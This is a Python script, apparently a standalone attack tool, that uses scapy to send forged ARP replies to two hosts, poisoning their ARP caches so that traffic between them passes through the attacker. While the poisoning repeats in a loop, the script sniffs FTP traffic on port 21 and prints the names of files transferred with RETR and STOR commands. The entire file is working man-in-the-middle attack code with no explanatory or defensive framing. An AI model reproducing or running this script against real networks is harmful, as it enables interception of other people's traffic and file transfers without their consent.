import scapy.all as scapy
import sys


if len(sys.argv) < 5:
	print("Error args")
	exit(1)


ip_src = sys.argv[1]
mac_src = sys.argv[2]
ip_target = sys.argv[3]
mac_target = sys.argv[4]


def spoofing(ip_dst, mac_dst, ip_src):
	packet = scapy.ARP(op=2, hwdst=mac_dst, pdst=ip_dst, psrc=ip_src)
	scapy.send(packet, verbose=False)


def packet_callback(packet):
	print("enter")
	if packet.haslayer(scapy.TCP) and packet.haslayer(scapy.Raw):
		payload = packet[scapy.Raw].load
		if b"RETR" in payload:
			print(f"Downloading: {payload.decode()[5:-2]}")
		elif b"STOR" in payload:
			print(f"Uploading: {payload.decode()[5:-2]}")


while True:
	spoofing(ip_target, mac_target, ip_src)
	spoofing(ip_src, mac_src, ip_target)
	scapy.sniff(iface="eth0", prn=packet_callback, filter="tcp port 21")
